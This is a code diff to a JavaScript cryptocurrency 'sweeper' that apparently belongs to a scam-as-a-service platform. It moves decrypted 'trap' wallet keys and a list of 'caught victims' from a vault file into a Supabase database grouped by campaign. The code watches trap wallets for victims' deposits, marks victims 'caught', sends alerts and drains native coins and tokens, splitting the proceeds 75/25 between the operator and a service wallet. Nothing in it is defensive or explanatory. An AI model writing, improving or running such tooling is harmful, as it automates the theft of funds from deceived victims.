@@ -1,6 +1,4 @@
 import 'dotenv/config';
-import fs from 'fs';
-import { promises as fsp } from 'fs';
 import { createWalletClient, http, publicActions, formatEther, formatUnits, parseAbi, encodeFunctionData, getAddress } from 'viem';
 import { privateKeyToAccount } from 'viem/accounts';
 import { mainnet, bsc, polygon } from 'viem/chains';
@@ -39,13 +37,12 @@ if (supabaseUrl && supabaseServiceKey) {
   supabaseService = createClient(supabaseUrl, supabaseServiceKey);
   console.log('[DEBUG] Supabase service client initialized');
 } else {
-  console.warn('[DEBUG] Supabase service credentials missing – profit sharing disabled');
+  console.warn('[DEBUG] Supabase service credentials missing – profit sharing and DB features disabled');
 }
 
 // --- Config ---
 const {
   sweeper: { pollIntervalMs, safeWallet },
-  files: { vault: vaultFile, caught: caughtFile },
   rpc: { sweeper: sweeperRpcUrl },
 } = config;
 
@@ -55,8 +52,7 @@ if (!SERVICE_WALLET) {
   logger.warn('SERVICE_WALLET_ADDRESS not set. Service share will be skipped.');
 }
 
-// --- Caught victims file (from config) ---
-const CAUGHT_FILE = caughtFile;
+// --- Caught victims (in-memory set, synced from database) ---
 const caughtVictims = new Set();
 
 // --- Catch threshold (USD) ---
@@ -149,43 +145,114 @@ async function createProfitShare(transactionId, userAmount, serviceAmount, userT
   }
 }
 
-// --- Safely load caught victims (Atomic Set Replacement) ---
-function loadCaughtVictims() {
+// ─── Load caught victims from database ───
+async function loadCaughtVictims() {
+  if (!supabaseService) {
+    console.warn('[sweeper] Supabase service not available – caught victims list will be empty');
+    return;
+  }
   try {
-    if (fs.existsSync(CAUGHT_FILE)) {
-      const data = fs.readFileSync(CAUGHT_FILE, 'utf8');
-      
-      if (data.trim().length === 0) return; // Prevent 0-byte mid-write race condition
-      
-      const lines = data.split('\n').map(l => l.trim()).filter(l => l.length > 0);
-      const newSet = new Set(lines.map(addr => addr.toLowerCase()));
-      
-      if (newSet.size > 0) {
-        caughtVictims.clear();
-        newSet.forEach(addr => caughtVictims.add(addr));
-      }
+    const { data, error } = await supabaseService
+      .from('traps')
+      .select('victim_address')
+      .eq('is_caught', true);
+    if (error) throw error;
+    if (data && data.length > 0) {
+      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
+      caughtVictims.clear();
+      newSet.forEach(addr => caughtVictims.add(addr));
+      console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
     }
   } catch (err) {
-    console.warn(`[DEBUG] Could not read caught victims file: ${err.message}`);
+    console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
   }
 }
-loadCaughtVictims();
 
-// --- Periodically reload caught victims (sync with other processes) ---
-setInterval(loadCaughtVictims, 30000);
-
-// Helper to mark a victim as caught (append to file + in‑memory set)
+// ─── Mark a victim as caught (database) ───
 async function markVictimCaught(victimAddress) {
   if (!victimAddress) return;
   const addr = victimAddress.toLowerCase();
   if (caughtVictims.has(addr)) return;
   caughtVictims.add(addr);
+  if (!supabaseService) {
+    logger.warn(`Cannot mark caught: Supabase service not available`);
+    return;
+  }
   try {
-    await fsp.appendFile(CAUGHT_FILE, addr + '\n', 'utf8');
+    // Update all traps for this victim to is_caught = true
+    await supabaseService
+      .from('traps')
+      .update({ is_caught: true })
+      .eq('victim_address', addr);
     logger.info(`Victim marked as caught: ${addr}`);
     await sendAlert(`🎯 Victim caught\nVictim: ${addr}`);
   } catch (err) {
-    logger.error(`Failed to write caught victim ${addr}: ${err.message}`);
+    logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
+  }
+}
+
+// ─── Load traps from database (supports campaignId or all traps for chain) ───
+async function getTrapsFromDB(campaignId = null) {
+  if (!supabaseService) {
+    logger.error('Supabase service client not available.');
+    return [];
+  }
+  try {
+    let query = supabaseService
+      .from('traps')
+      .select('trap_private_key_enc, victim_address, trap_address, campaign_id');
+    if (campaignId) {
+      query = query.eq('campaign_id', campaignId);
+    } else {
+      // If no campaignId, fetch all traps for the current chain
+      // We need to join with campaigns to filter by chain
+      // We'll use a subquery: get campaign ids for the chain
+      // For simplicity, we'll first get campaigns for this chain
+      const { data: campaigns, error: campError } = await supabaseService
+        .from('campaigns')
+        .select('id')
+        .eq('chain', chainName);
+      if (campError) {
+        console.error('[sweeper] Failed to fetch campaigns for chain:', campError);
+        return [];
+      }
+      if (!campaigns || campaigns.length === 0) {
+        console.log(`[sweeper] No campaigns found for chain ${chainName}`);
+        return [];
+      }
+      const campaignIds = campaigns.map(c => c.id);
+      query = query.in('campaign_id', campaignIds);
+    }
+
+    const { data, error } = await query;
+    if (error) throw error;
+    if (!data || data.length === 0) {
+      console.log(`[sweeper] No traps found${campaignId ? ` for campaign ${campaignId}` : ` on chain ${chainName}`}`);
+      return [];
+    }
+    const entries = [];
+    for (const row of data) {
+      const encKey = row.trap_private_key_enc;
+      if (!encKey) continue;
+      try {
+        const privateKey = decrypt(encKey);
+        const account = privateKeyToAccount(privateKey);
+        const trapAddress = account.address.toLowerCase();
+        entries.push({
+          privateKey,
+          trapAddress,
+          victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
+        });
+      } catch (e) {
+        logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
+        continue;
+      }
+    }
+    console.log(`[sweeper] Loaded ${entries.length} trap entries from database`);
+    return entries;
+  } catch (err) {
+    logger.error(`Failed to fetch traps from database: ${err.message}`);
+    return [];
   }
 }
 
@@ -217,7 +284,6 @@ switch (chainName) {
 // --- Token list: use chain‑specific tokens with correct decimals from config ---
 let TOKEN_LIST = [];
 if (chainCfg && chainCfg.tokens) {
-  // Get token decimals from config, fallback to 18
   const tokenDecimals = chainCfg.token_decimals || {};
   TOKEN_LIST = Object.entries(chainCfg.tokens).map(([symbol, address]) => {
     const decimals = tokenDecimals[symbol] ?? 18;
@@ -269,12 +335,10 @@ let lastPriceFetchFailed = false;
 
 async function fetchTokenPrices() {
   const now = Date.now();
-  // If cache is fresh and we have prices, return them
   if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) {
     return priceCache;
   }
 
-  // Build list of coin IDs
   const ids = [nativeSymbol.toLowerCase()];
   const tokenSymbols = TOKEN_LIST.map(t => t.symbol.toLowerCase());
   const allSymbols = [...new Set([...ids, ...tokenSymbols])];
@@ -297,8 +361,8 @@ async function fetchTokenPrices() {
     pepe: 'pepe',
     leo: 'leo-token',
     ton: 'toncoin',
-    wmatic: 'matic-network',   // WMATIC price = MATIC
-    wbnb: 'binancecoin',       // WBNB price = BNB
+    wmatic: 'matic-network',
+    wbnb: 'binancecoin',
     'usde': 'ethena-usde',
   };
 
@@ -316,7 +380,6 @@ async function fetchTokenPrices() {
           newCache[sym] = data[id].usd;
         }
       }
-      // If we got at least one price, update cache
       if (Object.keys(newCache).length > 0) {
         priceCache = newCache;
         lastPriceFetch = now;
@@ -331,7 +394,6 @@ async function fetchTokenPrices() {
   } catch (e) {
     logger.warn(`Price fetch failed: ${e.message}`);
     lastPriceFetchFailed = true;
-    // If we have a stale cache, we'll keep using it but with a warning
     if (Object.keys(priceCache).length === 0) {
       priceCache = {};
     }
@@ -339,98 +401,7 @@ async function fetchTokenPrices() {
   return priceCache;
 }
 
-// --- Parse vault ---
-function parseVault(filePath) {
-  console.log(`[DEBUG] parseVault called for ${filePath}`);
-  const entries = [];
-  if (!fs.existsSync(filePath)) {
-    console.error(`[DEBUG] ${filePath} not found.`);
-    logger.error(`${filePath} not found.`);
-    return entries;
-  }
-  const lines = fs.readFileSync(filePath, 'utf8').split('\n');
-  console.log(`[DEBUG] Read ${lines.length} lines from vault.`);
-
-  let lineNumber = 0, parsedCount = 0, errorCount = 0;
-  for (const rawLine of lines) {
-    lineNumber++;
-    const line = rawLine.trim();
-    if (!line) continue;
-    if (lineNumber % 100 === 0) {
-      console.log(`[DEBUG] Processing line ${lineNumber}... (parsed ${parsedCount}, errors ${errorCount})`);
-    }
-    let decryptedLine;
-    try {
-      decryptedLine = decrypt(line);
-    } catch (e) {
-      errorCount++;
-      continue;
-    }
-    const match = decryptedLine.match(/Victim:\s*(0x[a-fA-F0-9]{40}).*Counterparty:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})/i);
-    if (match) {
-      entries.push({ privateKey: match[3], trapAddress: match[2], victimAddress: match[1] });
-      parsedCount++;
-    } else {
-      const fallback = decryptedLine.match(/Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})/i);
-      if (fallback) {
-        entries.push({ privateKey: fallback[2], trapAddress: null, victimAddress: fallback[1] });
-        parsedCount++;
-      }
-    }
-  }
-  console.log(`[DEBUG] Finished parsing. Parsed ${parsedCount} entries, ${errorCount} errors.`);
-  return entries;
-}
-
-// --- NEW: Fetch trap entries from database ---
-async function getTrapsFromDB(campaignId) {
-  if (!supabaseService) {
-    logger.error('Supabase service client not available.');
-    return [];
-  }
-  try {
-    const { data, error } = await supabaseService
-      .from('traps')
-      .select('trap_private_key_enc, victim_address, trap_address')
-      .eq('campaign_id', campaignId);
-    if (error) throw error;
-    if (!data || data.length === 0) {
-      logger.info(`No traps found for campaign ${campaignId}`);
-      return [];
-    }
-    const entries = [];
-    for (const row of data) {
-      const encKey = row.trap_private_key_enc;
-      if (!encKey) continue;
-      try {
-        const privateKey = decrypt(encKey);
-        // Verify the private key works
-        const account = privateKeyToAccount(privateKey);
-        const trapAddress = account.address.toLowerCase();
-        // Validate against stored trap_address (optional)
-        if (trapAddress !== row.trap_address.toLowerCase()) {
-          logger.warn(`Mismatch: derived address ${trapAddress} != stored ${row.trap_address}`);
-          // Use derived address
-        }
-        entries.push({
-          privateKey,
-          trapAddress: trapAddress,
-          victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
-        });
-      } catch (e) {
-        logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
-        continue;
-      }
-    }
-    logger.info(`Loaded ${entries.length} trap entries from database for campaign ${campaignId}`);
-    return entries;
-  } catch (err) {
-    logger.error(`Failed to fetch traps from database: ${err.message}`);
-    return [];
-  }
-}
-
-// --- Create clients from DB entries (similar to vault) ---
+// --- Create clients from DB entries ---
 function createSweeperClientsFromEntries(entries) {
   console.log(`[DEBUG] Creating clients for ${entries.length} entries...`);
   const clients = [];
@@ -457,34 +428,7 @@ function createSweeperClientsFromEntries(entries) {
   return clients;
 }
 
-// --- Create clients from vault (existing function) ---
-function createSweeperClients(entries) {
-  console.log(`[DEBUG] Creating clients for ${entries.length} entries...`);
-  const clients = [];
-  for (const entry of entries) {
-    try {
-      const account = privateKeyToAccount(entry.privateKey);
-      const trapAddress = account.address;
-      const client = createWalletClient({
-        account,
-        chain: viemChain,
-        transport: http(chainRpc, { timeout: 10000 }),
-      }).extend(publicActions);
-      clients.push({
-        ...entry,
-        trapAddress,
-        account,
-        client,
-      });
-    } catch (e) {
-      logger.error(`Invalid private key: ${entry.privateKey.slice(0, 10)}...`);
-    }
-  }
-  console.log(`[DEBUG] Created ${clients.length} valid clients.`);
-  return clients;
-}
-
-// --- Modified sweepAddress with profit splitting (unchanged) ---
+// --- sweepAddress (unchanged except markVictimCaught now DB-based) ---
 async function sweepAddress(client, trapAddress, safeWallet, victimAddress = null) {
   const timeoutMs = 30000;
   const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Sweep timeout')), timeoutMs));
@@ -493,9 +437,8 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
       (async () => {
         const prices = await fetchTokenPrices();
 
-        // Determine if we should split profits
         let profitSplitPercent = 75;
-        let userSafeWallet = safeWallet; // default
+        let userSafeWallet = safeWallet;
         let serviceWallet = SERVICE_WALLET;
         let useSplitting = false;
 
@@ -521,7 +464,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
           const ethValue = parseFloat(formatEther(balance));
           const usdValue = ethValue * nativePrice;
 
-          // Mark caught if threshold met
           if (usdValue >= MIN_CATCH_USD) {
             if (victimAddress) await markVictimCaught(victimAddress);
           }
@@ -529,7 +471,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
           if (usdValue >= MIN_SWEEP_USD) {
             const gasPrice = await withRpcRetry(() => client.getGasPrice(), `getGasPrice(${trapAddress})`, 2, 1000);
             let gasLimit = 21000n;
-            // If splitting, we need to send two transactions -> double gas
             if (useSplitting && serviceWallet) {
               gasLimit = 21000n * 2n;
             }
@@ -542,11 +483,9 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
               let serviceTxHash = null;
 
               if (useSplitting && serviceWallet) {
-                // Calculate shares
                 const userShare = profitSplitPercent / 100;
                 userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
                 serviceAmount = totalSendable - userAmount;
-                // Send to user
                 if (userAmount > 0n && userSafeWallet) {
                   userTxHash = await withRpcRetry(
                     () => client.sendTransaction({ to: userSafeWallet, value: userAmount, gas: 21000n, gasPrice }),
@@ -555,7 +494,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                   );
                   logger.info(`[!!!] ${nativeSymbol} USER SWEEP: ${formatEther(userAmount)} to ${userSafeWallet} TX: ${userTxHash}`);
                 }
-                // Send to service
                 if (serviceAmount > 0n && serviceWallet) {
                   serviceTxHash = await withRpcRetry(
                     () => client.sendTransaction({ to: serviceWallet, value: serviceAmount, gas: 21000n, gasPrice }),
@@ -565,7 +503,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                   logger.info(`[!!!] ${nativeSymbol} SERVICE SWEEP: ${formatEther(serviceAmount)} to ${serviceWallet} TX: ${serviceTxHash}`);
                 }
               } else {
-                // Original behavior: send all to safeWallet
                 userTxHash = await withRpcRetry(
                   () => client.sendTransaction({ to: userSafeWallet, value: totalSendable, gas: 21000n, gasPrice }),
                   `sendTransaction(${trapAddress})`,
@@ -575,7 +512,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 userAmount = totalSendable;
               }
 
-              // Record transaction and profit share
               if (campaignId && supabaseService) {
                 const txHash = userTxHash || serviceTxHash;
                 const txId = await createTransaction(
@@ -604,14 +540,13 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                   `TX: ${txHash}`
                 );
               } else {
-                // Fallback alert without DB
                 await sendAlert(`💰 ${nativeSymbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatEther(userAmount)} ${nativeSymbol}\nTX: ${userTxHash || serviceTxHash}`);
               }
             }
           }
         }
 
-        // --- RPC Rate Limit Protection using Multicall ---
+        // --- Token sweeps (unchanged) ---
         const multicallContracts = TOKEN_LIST.map(token => ({
           address: getAddress(token.address),
           abi: ERC20_ABI,
@@ -628,14 +563,13 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
           );
         } catch (e) {
           logger.warn(`Multicall failed for ${trapAddress}: ${e.message}`);
-          return; // Skip token sweep for this round if multicall fails
+          return;
         }
 
-        // --- Process Token sweeps ---
         for (let i = 0; i < TOKEN_LIST.length; i++) {
           const token = TOKEN_LIST[i];
           const result = tokenBalances[i];
-          
+
           if (result.status === 'success' && result.result > 0n) {
             const tokenBalance = result.result;
             const formatted = formatUnits(tokenBalance, token.decimals);
@@ -643,7 +577,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
             const tokenPrice = prices[tokenSymLower] || 0;
             const usdValue = parseFloat(formatted) * tokenPrice;
 
-            // Mark caught if threshold met
             if (usdValue >= MIN_CATCH_USD) {
               if (victimAddress) await markVictimCaught(victimAddress);
             }
@@ -655,7 +588,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
 
             try {
               const tokenAddr = getAddress(token.address);
-              // Estimate gas for one transfer (base)
               const gasEstimate = await withRpcRetry(
                 () => client.estimateGas({
                   account: client.account,
@@ -666,7 +598,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 2, 1000
               );
               const gasPrice = await withRpcRetry(() => client.getGasPrice(), `getGasPrice(token ${token.symbol})`, 2, 1000);
-              // If splitting, we need two transfers
               let totalFee = gasEstimate * gasPrice;
               if (useSplitting && serviceWallet) {
                 totalFee = totalFee * 2n;
@@ -686,7 +617,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 const userShare = profitSplitPercent / 100;
                 userAmount = (tokenBalance * BigInt(Math.round(userShare * 100))) / 100n;
                 serviceAmount = tokenBalance - userAmount;
-                // Send to user
                 if (userAmount > 0n && userSafeWallet) {
                   userTxHash = await withRpcRetry(
                     () => client.sendTransaction({
@@ -698,7 +628,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                   );
                   logger.info(`[!!!] ${token.symbol} USER SWEEP: ${formatUnits(userAmount, token.decimals)} to ${userSafeWallet} TX: ${userTxHash}`);
                 }
-                // Send to service
                 if (serviceAmount > 0n && serviceWallet) {
                   serviceTxHash = await withRpcRetry(
                     () => client.sendTransaction({
@@ -711,7 +640,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                   logger.info(`[!!!] ${token.symbol} SERVICE SWEEP: ${formatUnits(serviceAmount, token.decimals)} to ${serviceWallet} TX: ${serviceTxHash}`);
                 }
               } else {
-                // Original: send all to safeWallet
                 userTxHash = await withRpcRetry(
                   () => client.sendTransaction({
                     to: tokenAddr,
@@ -724,7 +652,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 userAmount = tokenBalance;
               }
 
-              // Record transaction and profit share
               if (campaignId && supabaseService) {
                 const txHash = userTxHash || serviceTxHash;
                 const txId = await createTransaction(
@@ -797,47 +724,25 @@ async function sweepSingle(privateKey, destination) {
   onShutdown(() => { clearInterval(interval); logger.info('Sweeper interval cleared.'); });
 }
 
-// --- Batch mode ---
+// --- Batch mode (DB-only) ---
 async function sweepBatch() {
   let entries = [];
   let trapToVictim = new Map();
 
-  if (campaignId && supabaseService) {
-    // Fetch from database
-    console.log(`[DEBUG] Fetching traps from database for campaign ${campaignId}`);
-    entries = await getTrapsFromDB(campaignId);
-    if (entries.length === 0) {
-      console.error(`[DEBUG] No traps found for campaign ${campaignId}. Exiting.`);
-      logger.error(`No traps found for campaign ${campaignId}. Exiting.`);
-      if (jobId) await updateJob('failed', null, null, 'No traps found');
-      process.exit(1);
-    }
-    // Build trap->victim map from entries
-    for (const e of entries) {
-      if (e.victimAddress) {
-        trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
-      }
-    }
-  } else {
-    // Fallback: read from vault
-    console.log('[DEBUG] Falling back to vault file');
-    const vaultEntries = parseVault(vaultFile);
-    if (vaultEntries.length === 0) {
-      console.error(`[DEBUG] No entries found in ${vaultFile}. Exiting.`);
-      logger.error(`No entries found in ${vaultFile}. Exiting.`);
-      process.exit(1);
-    }
-    // Convert vault entries to the same format as DB entries
-    entries = vaultEntries.map(e => ({
-      privateKey: e.privateKey,
-      trapAddress: e.trapAddress,
-      victimAddress: e.victimAddress || null,
-    }));
-    // Build trap->victim map from vault entries
-    for (const e of entries) {
-      if (e.victimAddress) {
-        trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
-      }
+  // Fetch traps from database (either by campaign or all traps for chain)
+  console.log(`[DEBUG] Fetching traps from database${campaignId ? ` for campaign ${campaignId}` : ` for chain ${chainName}`}`);
+  entries = await getTrapsFromDB(campaignId);
+  if (entries.length === 0) {
+    console.error(`[DEBUG] No traps found. Exiting.`);
+    logger.error(`No traps found. Exiting.`);
+    if (jobId) await updateJob('failed', null, null, 'No traps found');
+    process.exit(1);
+  }
+
+  // Build trap->victim map
+  for (const e of entries) {
+    if (e.victimAddress) {
+      trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
     }
   }
 
@@ -864,7 +769,6 @@ async function sweepBatch() {
     }
   };
 
-  // Start the loop using setTimeout chaining to avoid overlap
   const scheduleNext = () => {
     setTimeout(async () => {
       await runSweep();
@@ -872,7 +776,6 @@ async function sweepBatch() {
     }, pollIntervalMs);
   };
 
-  // Run first sweep immediately, then schedule next
   await runSweep();
   scheduleNext();
 
@@ -883,7 +786,11 @@ async function sweepBatch() {
 setupGracefulShutdown();
 
 // --- Entry point ---
-// If jobId is provided, update job to running
+// Load caught victims from DB on start
+await loadCaughtVictims();
+// Periodically reload caught victims
+setInterval(loadCaughtVictims, 30000);
+
 if (jobId) {
   updateJob('running').catch(err => logger.error(`Failed to update job start: ${err.message}`));
 }
